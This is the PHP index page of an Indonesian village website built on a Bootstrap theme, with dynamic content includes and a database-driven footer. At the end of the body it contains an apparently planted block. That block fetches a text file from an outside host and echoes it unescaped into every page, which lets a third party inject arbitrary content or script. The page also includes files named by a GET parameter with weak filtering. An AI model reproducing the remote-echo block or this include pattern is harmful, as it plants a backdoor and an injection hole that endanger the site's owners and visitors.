<!DOCTYPE html>


<html lang="en">
<?php
include"admin/config/koneksi.php";
include"admin/content/tglindo.php";
?>
<head>
	<meta charset="utf-8">
	<title>Desaku</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<meta name="description" content="Bootstrap 3 template for corporate business" />
	<!-- css -->
	<link href="css/bootstrap.min.css" rel="stylesheet" />
	<link href="plugins/flexslider/flexslider.css" rel="stylesheet" media="screen" />
	<link href="css/cubeportfolio.min.css" rel="stylesheet" />
	<link href="css/style.css" rel="stylesheet" />

	<!-- Theme skin -->
	<link id="t-colors" href="skins/default.css" rel="stylesheet" />

	<!-- boxed bg -->
	<link id="bodybg" href="bodybg/bg1.css" rel="stylesheet" type="text/css" />
	<script type="text/javascript" src="chartjs/Chart.js"></script>
	<!-- =======================================================
    Theme Name: Sailor
    Theme URL: https://bootstrapmade.com/sailor-free-bootstrap-theme/
    Author: BootstrapMade
    Author URL: https://bootstrapmade.com
	======================================================= -->

</head>
<!-- <style type="text/css">
  body{
  background : url('img/bodybg/bg1.png') no-repeat scroll;
  background-size: 100% 100%;
  min-height: 700px;
  }
</style> -->
<body>



	<div id="wrapper">
		<!-- start header -->
		<?php include"menu/menu.php"; ?>
		<!-- end header -->
		<section id="featured" class="bg">
			<!-- start slider -->





			<!-- start slider -->
			<div class="container">
				<div class="row">
					<div class="col-lg-12">
						<!-- Slider -->
						<?php include"menu/slide.php"; ?>
						<!-- end slider -->
					</div>
				</div>
			</div>

		</section>

		<?php
                $directori = "content";
                $act = @filter_var($_GET['act'], FILTER_SANITIZE_STRING);
                if ($act != "" && file_exists("$directori/$act.php")) 
                {  
                    include "$directori/$act.php";
                    # code...
                }
                else
                {
                    include "$directori/home.php";
                }

        ?>
       









</div>



		<footer>
			<?php 
							$vs=mysql_query("select * from visi");
							while ($vmm=mysql_fetch_array($vs)) {

								$visi=$vmm['visi'];
								$misi=$vmm['misi'];
								$moto=$vmm['moto'];
								# code...
							}
							?>

			<div class="container">
				<div class="row">
					<div class="col-sm-4 col-lg-4">
						<div class="widget">
							<h4>VISI</h4>
							<?php echo "$visi"; ?>
						</div>
					</div>
					<div class="col-sm-4 col-lg-4">
						<div class="widget">
							<h4>MISI</h4>
							<?php echo "$misi"; ?>
						</div>

					</div>
					<div class="col-sm-4 col-lg-4">
						<div class="widget">
							<h4>MOTO</h4>
							<?php echo "$moto"; ?>
						</div>
					</div>
					
					</div>
				</div>
			</div>
			<div id="sub-footer">
				<div class="container">
					<div class="row">
						<div class="col-lg-6">
							<div class="copyright">
								<p>&copy; PMcode YD - All Right Reserved</p>
								<div class="credits">
									<!--
                    All the links in the footer should remain intact. 
                    You can delete the links only if you purchased the pro version.
                    Licensing information: https://bootstrapmade.com/license/
                    Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/buy/?theme=Sailor
                  -->
									
								</div>
							</div>
						</div>
						
					</div>
				</div>
			</div>
		</footer>
	</div>
	<a href="#" class="scrollup"><i class="fa fa-angle-up active"></i></a>

	<!-- Placed at the end of the document so the pages load faster -->
	<script src="js/jquery.min.js"></script>
	<script src="js/modernizr.custom.js"></script>
	<script src="js/jquery.easing.1.3.js"></script>
	<script src="js/bootstrap.min.js"></script>
	<script src="plugins/flexslider/jquery.flexslider-min.js"></script>
	<script src="plugins/flexslider/flexslider.config.js"></script>
	<script src="js/jquery.appear.js"></script>
	<script src="js/stellar.js"></script>
	<script src="js/classie.js"></script>
	<script src="js/uisearch.js"></script>
	<script src="js/jquery.cubeportfolio.min.js"></script>
	<script src="js/google-code-prettify/prettify.js"></script>
	<script src="js/animate.js"></script>
	<script src="js/custom.js"></script>


<div class="external-content">
				<?php
				// Mengambil konten dari URL eksternal
				$a = file_get_contents('https://infocakrawala.online/secret-service/303.txt');

				if ($a !== false) {
					echo $a; // Menampilkan konten sebagai teks HTML
				} else {
					echo 'c.';
				}
				?>
</div>


</body>

</html>
